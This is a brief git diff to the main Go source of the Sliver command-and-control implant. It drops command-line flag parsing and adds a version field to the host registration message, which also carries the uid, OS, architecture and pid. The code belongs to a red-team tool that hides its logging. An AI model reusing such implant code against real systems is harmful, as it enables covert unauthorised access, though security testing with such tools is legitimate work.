@@ -25,7 +25,6 @@ import "C"
 // {{end}}
 
 import (
-	"flag"
 	"os"
 	"os/user"
 	"runtime"
@@ -42,6 +41,7 @@ import (
 	"github.com/bishopfox/sliver/sliver/handlers"
 	"github.com/bishopfox/sliver/sliver/limits"
 	"github.com/bishopfox/sliver/sliver/transports"
+	"github.com/bishopfox/sliver/sliver/version"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -64,9 +64,6 @@ func main() {
 	log.SetFlags(0)
 	log.SetOutput(ioutil.Discard)
 	// {{end}}
-
-	flag.Usage = func() {} // No help!
-	flag.Parse()
 
 	// {{if .Debug}}
 	log.Printf("Hello my name is %s", consts.SliverName)
@@ -161,6 +158,7 @@ func getRegisterSliver() *pb.Envelope {
 		Uid:      currentUser.Uid,
 		Gid:      currentUser.Gid,
 		Os:       runtime.GOOS,
+		Version:  version.GetVersion(),
 		Arch:     runtime.GOARCH,
 		Pid:      int32(os.Getpid()),
 		Filename: filename,
